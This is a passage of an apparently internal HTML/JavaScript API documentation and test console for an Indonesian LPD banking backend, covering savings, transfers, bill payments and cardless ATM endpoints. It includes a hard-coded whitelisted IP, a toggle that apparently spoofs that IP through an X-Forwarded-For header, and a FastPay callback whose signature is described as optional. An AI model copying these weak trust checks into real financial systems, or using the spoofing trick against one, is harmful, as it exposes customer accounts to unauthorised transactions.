<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- GROUP: TABUNGAN -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<div class="tag-group" id="grp-tabungan">
  <div class="tag-header" onclick="toggleGroup('grp-tabungan')">
    <i class="fas fa-piggy-bank" style="color:#16a34a;font-size:18px"></i>
    <div>
      <h2>Tabungan</h2>
      <div class="tag-desc">Daftar rekening, histori transaksi, dan mutasi tabungan</div>
    </div>
    <span class="tag-count">3 endpoints</span>
    <i class="fas fa-chevron-down" style="color:var(--muted);font-size:12px"></i>
  </div>
  <div class="grp-body">

    ${D("tab-list", "POST", "/api/smart/tabungan/account-list", "Daftar Rekening Nasabah", [{ name: "customer_id", in: "query", type: "string", req: true, desc: "Customer ID terenkripsi" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","data":[{"norek":"ENC...","type":"tabungan","saldo":"ENC...","currency":"IDR"},{"norek":"ENC...","type":"pinjaman","saldo":"ENC..."}]}', "", ["iosCheckAccess", "iosTokenMdw"], "Mengembalikan semua rekening (tabungan, pinjaman, deposito) dengan saldo terenkripsi.")}

    ${D("tab-history", "POST", "/api/smart/tabungan/transaction-history", "Histori Transaksi", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening (dienkripsi)" }, { name: "start_date", in: "query", type: "string", req: false, desc: "Tanggal mulai YYYY-MM-DD" }, { name: "end_date", in: "query", type: "string", req: false, desc: "Tanggal akhir YYYY-MM-DD" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","data":[{"tanggal":"2024-01-15","keterangan":"Transfer Masuk","debet":0,"kredit":100000,"saldo":1500000}]}', "", ["iosCheckAccess", "iosTokenMdw"], "Query dari gtb_folio, hasil dienkripsi. Default 30 hari terakhir jika tanggal tidak disertakan.")}

    ${D("tab-mutasi", "POST", "/api/smart/tabungan/mutasi-history", "Histori Mutasi", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening (dienkripsi)" }, { name: "period", in: "query", type: "string", req: false, desc: "Periode: YYYYMM (default: bulan ini)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","saldo_awal":"ENC...","saldo_akhir":"ENC...","data":[{"tgl":"2024-01-15","ket":"PPOB-PLN","nominal":"ENC...","jenis":"D"}]}', "", ["iosCheckAccess", "iosTokenMdw"], "Mutasi per periode (bulanan). Semua nilai nominal dienkripsi AES-256-CBC.")}

  </div>
</div>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- GROUP: TRANSFER -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<div class="tag-group" id="grp-transfer">
  <div class="tag-header" onclick="toggleGroup('grp-transfer')">
    <i class="fas fa-exchange-alt" style="color:#0891b2;font-size:18px"></i>
    <div>
      <h2>Transfer</h2>
      <div class="tag-desc">Transfer sesama LPD dan transfer ke bank lain (via BPD)</div>
    </div>
    <span class="tag-count">6 endpoints</span>
    <i class="fas fa-chevron-down" style="color:var(--muted);font-size:12px"></i>
  </div>
  <div class="grp-body">

    ${D("tr-lpd-check", "POST", "/api/smart/transfer/lpd/check", "LPD \u2013 Cek Rekening Tujuan", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening tujuan (dienkripsi AES-256)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses inquiry","product_type":"tabungan","customer_name":"I WAYAN SARI"}', "", ["iosCheckAccess", "iosTokenMdw"], "Verifikasi rekening tujuan sesama LPD. Error 01 = rekening tidak aktif.")}

    ${D("tr-lpd-inquiry", "POST", "/api/smart/transfer/lpd/inquiry", "LPD \u2013 Inquiry Transfer", [{ name: "from_acc", in: "query", type: "string", req: true, desc: "Rekening sumber (dienkripsi)" }, { name: "to_acc", in: "query", type: "string", req: true, desc: "Rekening tujuan (dienkripsi)" }, { name: "amount", in: "query", type: "string", req: true, desc: "Nominal (dienkripsi)" }, { name: "from_name", in: "query", type: "string", req: true, desc: "Nama pengirim (dienkripsi)" }, { name: "to_name", in: "query", type: "string", req: true, desc: "Nama penerima (dienkripsi)" }, { name: "remark", in: "query", type: "string", req: true, desc: "Keterangan + hashCode (dienkripsi, format: ket<>hash)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"81","message":"Sukses Inquiry"}', "", ["iosCheckAccess", "iosTokenMdw", "SHA-256 hash check", "Saldo & limit check"], "Verifikasi: hash SHA-256, saldo cukup (min SALDO_MIN=50.000), limit transfer (10K\u20131M). Status 81 = bisa dilanjutkan.")}

    ${D("tr-lpd-post", "POST", "/api/smart/transfer/lpd/post", "LPD \u2013 Posting Transfer", [{ name: "trans_no", in: "query", type: "string", req: true, desc: "Nomor transaksi unik (dienkripsi)" }, { name: "from_acc", in: "query", type: "string", req: true, desc: "Rekening sumber (dienkripsi)" }, { name: "to_acc", in: "query", type: "string", req: true, desc: "Rekening tujuan (dienkripsi)" }, { name: "amount", in: "query", type: "string", req: true, desc: "Nominal (dienkripsi)" }, { name: "pin", in: "query", type: "string", req: true, desc: "PIN nasabah (dienkripsi)" }, { name: "remark", in: "query", type: "string", req: true, desc: "Keterangan (dienkripsi)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Transfer Berhasil","reference_no":"20240115120001"}', "", ["iosCheckAccess", "iosTokenMdw", "PIN validation", "Duplicate check (trans_no)", "DB: gtb_folio + gak_mutasi"], "Error 40=saldo kurang, 45=duplikat transaksi, 51-53=hash mismatch, 54=PIN salah. Posting ke gtb_folio dan gak_mutasi.")}

    ${D("tr-bank-check", "POST", "/api/smart/transfer/bank/check", "Bank \u2013 Cek Rekening Tujuan", [{ name: "bank_code", in: "query", type: "string", req: true, desc: "Kode bank tujuan (dienkripsi)" }, { name: "account_no", in: "query", type: "string", req: true, desc: "Rekening tujuan di bank (dienkripsi)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","customer_name":"I KETUT DANA","bank_name":"BNI"}', "", ["iosCheckAccess", "iosTokenMdw"], "Melakukan cURL ke BPD API untuk validasi rekening tujuan di bank lain.")}

    ${D("tr-bank-inquiry", "POST", "/api/smart/transfer/bank/inquiry", "Bank \u2013 Inquiry Transfer", [{ name: "bank_code", in: "query", type: "string", req: true, desc: "Kode bank tujuan (dienkripsi)" }, { name: "account_no", in: "query", type: "string", req: true, desc: "Rekening tujuan (dienkripsi)" }, { name: "from_acc", in: "query", type: "string", req: true, desc: "Rekening sumber (dienkripsi)" }, { name: "amount", in: "query", type: "string", req: true, desc: "Nominal transfer (dienkripsi)" }, { name: "remark", in: "query", type: "string", req: true, desc: "Keterangan + hash (dienkripsi)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"81","message":"Sukses Inquiry","fee":"3500","total":"103500"}', "", ["iosCheckAccess", "iosTokenMdw", "HMAC-SHA256 check", "BPD cURL call"], "Menghitung biaya transfer dari gcore_bankcode. Status 81 = dapat dilanjutkan ke posting.")}

    ${D("tr-bank-post", "POST", "/api/smart/transfer/bank/post", "Bank \u2013 Posting Transfer", [{ name: "bank_code", in: "query", type: "string", req: true, desc: "Kode bank (dienkripsi)" }, { name: "account_no", in: "query", type: "string", req: true, desc: "Rekening tujuan (dienkripsi)" }, { name: "from_acc", in: "query", type: "string", req: true, desc: "Rekening sumber (dienkripsi)" }, { name: "amount", in: "query", type: "string", req: true, desc: "Nominal (dienkripsi)" }, { name: "pin", in: "query", type: "string", req: true, desc: "PIN nasabah (dienkripsi)" }, { name: "trans_no", in: "query", type: "string", req: true, desc: "Nomor transaksi (dienkripsi)" }, { name: "remark", in: "query", type: "string", req: true, desc: "Keterangan (dienkripsi)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Transfer Berhasil","reference_no":"BPD20240115001"}', "", ["iosCheckAccess", "iosTokenMdw", "PIN check", "BPD API call via cURL", "DB: gcore_transfer"], "Mengirim ke BPD API, jika sukses insert ke gcore_transfer. Jika gagal, lakukan rollback gtb_folio.")}

  </div>
</div>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- GROUP: PPOB -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<div class="tag-group" id="grp-ppob">
  <div class="tag-header" onclick="toggleGroup('grp-ppob')">
    <i class="fas fa-bolt" style="color:#f59e0b;font-size:18px"></i>
    <div>
      <h2>PPOB &amp; IAK</h2>
      <div class="tag-desc">Pembayaran tagihan PLN, PDAM, BPJS, Pulsa (via FastPay &amp; IAK)</div>
    </div>
    <span class="tag-count">4 endpoints</span>
    <i class="fas fa-chevron-down" style="color:var(--muted);font-size:12px"></i>
  </div>
  <div class="grp-body">

    ${D("ppob-check", "POST", "/api/smart/ppob/check", "PPOB \u2013 Cek Tagihan", [{ name: "product_code", in: "query", type: "string", req: true, desc: "Kode produk PPOB (dienkripsi). Contoh: PLN-POSTPAID" }, { name: "customer_id", in: "query", type: "string", req: true, desc: "ID Pelanggan / nomor meter (dienkripsi)" }, { name: "account_no", in: "query", type: "string", req: true, desc: "Rekening pembayaran (dienkripsi)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","customer_name":"I MADE SUKERTA","tagihan":"150000","period":"202401","denda":"0","total":"150000","admin":"2500"}', "", ["iosCheckAccess", "iosTokenMdw"], "Cek ke FastPay/IAK. Kembalikan detail tagihan: nama, jumlah, periode, denda, biaya admin.")}

    ${D("ppob-request", "POST", "/api/smart/ppob/request", "PPOB \u2013 Bayar Tagihan", [{ name: "product_code", in: "query", type: "string", req: true, desc: "Kode produk PPOB (dienkripsi)" }, { name: "customer_id", in: "query", type: "string", req: true, desc: "ID Pelanggan (dienkripsi)" }, { name: "account_no", in: "query", type: "string", req: true, desc: "Rekening pembayaran (dienkripsi)" }, { name: "amount", in: "query", type: "string", req: true, desc: "Nominal pembayaran (dienkripsi)" }, { name: "pin", in: "query", type: "string", req: true, desc: "PIN transaksi (dienkripsi)" }, { name: "trans_no", in: "query", type: "string", req: true, desc: "Nomor transaksi unik (dienkripsi)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Pembayaran Berhasil","ref_no":"FP20240115001","struk":"PLN POSTPAID 150000 OK"}', "", ["iosCheckAccess", "iosTokenMdw", "PIN validation", "Saldo check", "FastPay/IAK API call"], "Cek saldo cukup, kirim ke FastPay/IAK, insert gppob_transaction dan gtb_folio. Jika gagal = rollback.")}

    ${D("iak-check", "POST", "/api/smart/iak/check", "IAK \u2013 Cek Produk", [{ name: "product_code", in: "query", type: "string", req: true, desc: "Kode produk IAK (dienkripsi). Contoh: TSEL5 (Telkomsel 5K)" }, { name: "customer_id", in: "query", type: "string", req: true, desc: "Nomor HP tujuan (dienkripsi)" }, { name: "account_no", in: "query", type: "string", req: true, desc: "Rekening pembayaran (dienkripsi)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","product_name":"Telkomsel 5.000","price":"5500","admin":"0"}', "", ["iosCheckAccess", "iosTokenMdw"], "Cek ketersediaan dan harga produk IAK (pulsa, paket data, game voucher).")}

    ${D("iak-request", "POST", "/api/smart/iak/request", "IAK \u2013 Beli Produk", [{ name: "product_code", in: "query", type: "string", req: true, desc: "Kode produk IAK (dienkripsi)" }, { name: "customer_id", in: "query", type: "string", req: true, desc: "Nomor HP tujuan (dienkripsi)" }, { name: "account_no", in: "query", type: "string", req: true, desc: "Rekening pembayaran (dienkripsi)" }, { name: "pin", in: "query", type: "string", req: true, desc: "PIN transaksi (dienkripsi)" }, { name: "trans_no", in: "query", type: "string", req: true, desc: "Nomor transaksi unik (dienkripsi)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Transaksi Berhasil","ref_no":"IAK20240115001","sn":"SN123456789"}', "", ["iosCheckAccess", "iosTokenMdw", "PIN validation", "IAK API call"], "Pembelian pulsa/paket via IAK API. SN = serial number produk dari IAK.")}

  </div>
</div>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- GROUP: ATM -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<div class="tag-group" id="grp-atm">
  <div class="tag-header" onclick="toggleGroup('grp-atm')">
    <i class="fas fa-credit-card" style="color:#dc2626;font-size:18px"></i>
    <div>
      <h2>ATM Cardless</h2>
      <div class="tag-desc">Operasi mesin ATM tanpa kartu \u2013 token, saldo, setor, tarik, batal</div>
    </div>
    <span class="tag-count">7 endpoints</span>
    <i class="fas fa-chevron-down" style="color:var(--muted);font-size:12px"></i>
  </div>
  <div class="grp-body">

    ${D("atm-create-token", "POST", "/api/cardless/create-token", "ATM \u2013 Buat Token Cardless", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening lengkap (format: PREFIX+norek, contoh: 8812341.123456)" }, { name: "X-Machine-Hash", in: "header", type: "string", req: true, desc: "HMAC-SHA256 hash dari mesin ATM" }, { name: "X-Machine-IP", in: "header", type: "string", req: true, desc: "IP address mesin ATM (whitelist)" }], '{"status":"00","message":"Token Berhasil.","data":"A1B2C3"}', "", ["machineCheck middleware", "IP whitelist", "HMAC hash validation"], "Token 6 karakter, berlaku 5 menit. Disimpan di gmob_token. Digunakan untuk transaksi cardless.")}

    ${D("atm-get-token", "POST", "/api/cardless/get-token", "ATM \u2013 Validasi Token dari Mobile", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening (format BPD)" }, { name: "transaction_code", in: "query", type: "string", req: true, desc: 'Kode transaksi ATM (harus "39")' }, { name: "transaction_id", in: "query", type: "string", req: true, desc: "ID transaksi ATM" }, { name: "transaction_datetime", in: "query", type: "string", req: true, desc: "Datetime transaksi (YYYYMMDDHHmmss)" }, { name: "X-Machine-Hash", in: "header", type: "string", req: true, desc: "HMAC hash mesin" }, { name: "X-Machine-IP", in: "header", type: "string", req: true, desc: "IP mesin ATM" }], '{"transaction_code":"39","transaction_id":"TXN001","response_code":"00","token":"A1B2C3"}', "", ["machineCheck middleware"], "Mesin ATM memanggil ini untuk mendapatkan token yang dibuat nasabah dari mobile. response_code: 00=OK, 12=kode salah, 14=rekening tidak aktif, 30=token expired.")}

    ${D("atm-balance", "POST", "/api/cardless/check-balance", "ATM \u2013 Cek Saldo", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening (format BPD)" }, { name: "token", in: "query", type: "string", req: true, desc: "Token cardless 6 digit" }, { name: "X-Machine-Hash", in: "header", type: "string", req: true, desc: "HMAC hash mesin" }, { name: "X-Machine-IP", in: "header", type: "string", req: true, desc: "IP mesin" }], '{"status":"00","message":"Sukses","saldo":"1500000","account_no":"1.123456","account_name":"I MADE BUDI"}', "", ["machineCheck middleware", "Token validation"], "Validasi token aktif, kembalikan saldo dari gtb_folio (sum kredit-debit).")}

    ${D("atm-debit", "POST", "/api/cardless/cash-debit", "ATM \u2013 Penarikan Tunai", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening" }, { name: "token", in: "query", type: "string", req: true, desc: "Token cardless aktif" }, { name: "amount", in: "query", type: "string", req: true, desc: "Nominal penarikan (numerik)" }, { name: "transaction_id", in: "query", type: "string", req: true, desc: "ID transaksi ATM unik" }, { name: "transaction_datetime", in: "query", type: "string", req: true, desc: "Datetime (YYYYMMDDHHmmss)" }, { name: "X-Machine-Hash", in: "header", type: "string", req: true, desc: "HMAC hash mesin" }, { name: "X-Machine-IP", in: "header", type: "string", req: true, desc: "IP mesin" }], '{"status":"00","message":"Penarikan Berhasil","saldo_akhir":"1400000","reference":"ATM20240115001"}', "", ["machineCheck", "Token validation", "Saldo check", "DB: gtb_folio + gak_mutasi"], "Debet rekening nasabah. Insert folio debet ke gtb_folio dan mutasi ke gak_mutasi. Token dinonaktifkan setelah transaksi.")}

    ${D("atm-credit", "POST", "/api/cardless/cash-credit", "ATM \u2013 Penyetoran Tunai", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening" }, { name: "token", in: "query", type: "string", req: true, desc: "Token cardless aktif" }, { name: "amount", in: "query", type: "string", req: true, desc: "Nominal setoran (numerik)" }, { name: "transaction_id", in: "query", type: "string", req: true, desc: "ID transaksi ATM unik" }, { name: "transaction_datetime", in: "query", type: "string", req: true, desc: "Datetime (YYYYMMDDHHmmss)" }, { name: "X-Machine-Hash", in: "header", type: "string", req: true, desc: "HMAC hash mesin" }, { name: "X-Machine-IP", in: "header", type: "string", req: true, desc: "IP mesin" }], '{"status":"00","message":"Setoran Berhasil","saldo_akhir":"1600000","reference":"ATM20240115002"}', "", ["machineCheck", "Token validation", "DB: gtb_folio + gak_mutasi"], "Kredit rekening nasabah. Insert folio kredit ke gtb_folio. Token dinonaktifkan setelah transaksi.")}

    ${D("atm-rev-debit", "POST", "/api/cardless/reversal-debit", "ATM \u2013 Batal Penarikan", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening" }, { name: "transaction_id", in: "query", type: "string", req: true, desc: "ID transaksi yang akan dibatalkan" }, { name: "X-Machine-Hash", in: "header", type: "string", req: true, desc: "HMAC hash mesin" }, { name: "X-Machine-IP", in: "header", type: "string", req: true, desc: "IP mesin" }], '{"status":"00","message":"Batal Penarikan Berhasil"}', "", ["machineCheck", "Transaction lookup"], "Reversal transaksi penarikan. Hapus record dari gtb_folio dan gak_mutasi berdasarkan transaction_id.")}

    ${D("atm-rev-credit", "POST", "/api/cardless/reversal-credit", "ATM \u2013 Batal Setoran", [{ name: "account_no", in: "query", type: "string", req: true, desc: "Nomor rekening" }, { name: "transaction_id", in: "query", type: "string", req: true, desc: "ID transaksi yang akan dibatalkan" }, { name: "X-Machine-Hash", in: "header", type: "string", req: true, desc: "HMAC hash mesin" }, { name: "X-Machine-IP", in: "header", type: "string", req: true, desc: "IP mesin" }], '{"status":"00","message":"Batal Setoran Berhasil"}', "", ["machineCheck", "Transaction lookup"], "Reversal transaksi setoran. Hapus record folio kredit dari database.")}

  </div>
</div>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- GROUP: PPOB CALLBACK -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<div class="tag-group" id="grp-ppob-cb">
  <div class="tag-header" onclick="toggleGroup('grp-ppob-cb')">
    <i class="fas fa-reply" style="color:#6b7280;font-size:18px"></i>
    <div>
      <h2>PPOB Callback</h2>
      <div class="tag-desc">Webhook dari FastPay untuk notifikasi hasil transaksi PPOB</div>
    </div>
    <span class="tag-count">1 endpoint</span>
    <i class="fas fa-chevron-down" style="color:var(--muted);font-size:12px"></i>
  </div>
  <div class="grp-body">

    ${D("ppob-cb", "POST", "/api/ppob/callback", "PPOB \u2013 Notifikasi Callback FastPay", [{ name: "ref_id", in: "body", type: "string", req: true, desc: "Reference ID transaksi dari FastPay" }, { name: "product_code", in: "body", type: "string", req: true, desc: "Kode produk" }, { name: "customer_id", in: "body", type: "string", req: true, desc: "ID pelanggan" }, { name: "status", in: "body", type: "string", req: true, desc: "Status: 00=sukses, lainnya=gagal" }, { name: "amount", in: "body", type: "number", req: true, desc: "Nominal transaksi" }, { name: "timestamp", in: "body", type: "string", req: false, desc: "Waktu callback dari FastPay" }, { name: "X-FastPay-Signature", in: "header", type: "string", req: false, desc: "Tanda tangan dari FastPay (opsional tergantung konfigurasi)" }], '{"status":"00","message":"OK"}', `{
  "ref_id": "FP20240115001",
  "product_code": "PLN-POSTPAID",
  "customer_id": "12345678901",
  "status": "00",
  "amount": 152500,
  "timestamp": "2024-01-15T10:35:00Z"
}`, ["IP whitelist FastPay"], "Update status transaksi di gppob_transaction. Jika status gagal, rollback folio nasabah.")}

  </div>
</div>

</main>
</div>

<script>
var openCards = {};
var openGroups = {};

function epToggle(id) {
  var card = document.getElementById('ep-'+id);
  if (!card) return;
  var isOpen = card.classList.contains('open');
  card.classList.toggle('open', !isOpen);
  openCards[id] = !isOpen;
}

function toggleGroup(id) {
  var grp = document.getElementById(id);
  if (!grp) return;
  var body = grp.querySelector('.grp-body');
  if (!body) return;
  var isHidden = body.style.display === 'none';
  body.style.display = isHidden ? '' : 'none';
  var chevron = grp.querySelector('.tag-header .fa-chevron-down, .tag-header .fa-chevron-up');
  if (chevron) {
    chevron.classList.toggle('fa-chevron-down', !isHidden);
    chevron.classList.toggle('fa-chevron-up', isHidden);
  }
}

function showTab(epId, tab) {
  var panes = document.querySelectorAll('#ep-'+epId+' .ep-pane');
  var tabs = document.querySelectorAll('#ep-'+epId+' .ep-tab');
  panes.forEach(function(p){ p.classList.remove('active'); });
  tabs.forEach(function(t){ t.classList.remove('active'); });
  var pane = document.getElementById('pane-'+epId+'-'+tab);
  var tabEl = document.getElementById('tab-'+epId+'-'+tab);
  if (pane) pane.classList.add('active');
  if (tabEl) tabEl.classList.add('active');
}

function scrollTo(id) {
  var el = document.getElementById(id);
  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// \u2500\u2500\u2500 Global token store \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
var _tokens = { snap: null, ios: null, snapHeaders: {}, iosHeaders: {} };
window._tokenHdrCache = {};


var WHITELIST_IP = '34.50.74.78';

function toggleXFwd(label) {
  var chk = document.getElementById('chk-xforward');
  // If the click came from the label (not directly on checkbox), toggle manually
  if (event && event.target !== chk) {
    chk.checked = !chk.checked;
    event.preventDefault();
  }
  updateXFwdStyle();
}
function updateXFwdStyle() {
  var chk = document.getElementById('chk-xforward');
  var lbl = document.getElementById('xfwd-label');
  if (!lbl) return;
  if (chk && chk.checked) {
    lbl.classList.add('active');
  } else {
    lbl.classList.remove('active');
  }
}

function getBaseUrl() {
  return (document.getElementById('base-url-input').value || '').replace(/\\/+$/, '');
}

// \u2500\u2500\u2500 Auto Token \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
function autoToken(type) {
  var btn = document.getElementById('btn-' + type + '-token');
  if (!btn) return;
  var origHtml = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Generating...';

  // Read optional client-key override from UI
  var clientKeyEl = document.getElementById('snap-client-key');
  var clientKey = clientKeyEl ? clientKeyEl.value.trim() : '';

  var payload = { type: type, baseUrl: getBaseUrl() };
  if (clientKey) payload.clientKey = clientKey;

  var t0 = Date.now();
  fetch('/api/token/generate', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(function(r){ return r.json(); })
  .then(function(d){
    var ms = Date.now() - t0;
    d._ms = ms;
    if (type === 'snap') {
      _tokens.snap = d.token;
      _tokens.snapHeaders = d.headers || {};
      updateTokenBadge('snap', d.token, d);
      // Inject headers even when token is null (we still have valid timestamp+signature)
      if (d.headers) injectSnapHeaders(d.headers, d.token);
    } else {
      _tokens.ios = d.token;
      _tokens.iosHeaders = d.headers || {};
      updateTokenBadge('ios', d.token, d);
      if (d.headers) injectIosHeaders(d.headers, d.token);
    }
    if (d.token) localStorage.setItem('lpd_'+type+'_token', d.token);
    showTokenDetail(type, d);
  })
  .catch(function(e){
    showTokenDetail(type, { ok: false, error: 'Fetch error: ' + e.message,
      hint: 'Periksa Base URL dan koneksi jaringan.' });
  })
  .finally(function(){ btn.disabled = false; btn.innerHTML = origHtml; });
}

function updateTokenBadge(type, token, d) {
  var el = document.getElementById(type + '-token-badge');
  if (!el) return;
  var dot = el.querySelector('i');
  var txt = el.querySelector('span');
  if (token) {
    el.style.background   = type === 'snap' ? 'rgba(91,33,182,.25)' : 'rgba(6,95,70,.25)';
    el.style.color        = '#e2e8f0';
    el.style.borderColor  = type === 'snap' ? '#7c3aed' : '#059669';
    if (dot) { dot.style.color = type === 'snap' ? '#a78bfa' : '#34d399'; }
    if (txt) txt.textContent  = type.toUpperCase() + ' \u2713 ' + token.substring(0,16) + '...';
    el.title = 'Token: ' + token + (d && d.timestamp ? ' | ' + d.timestamp : '');
  } else {
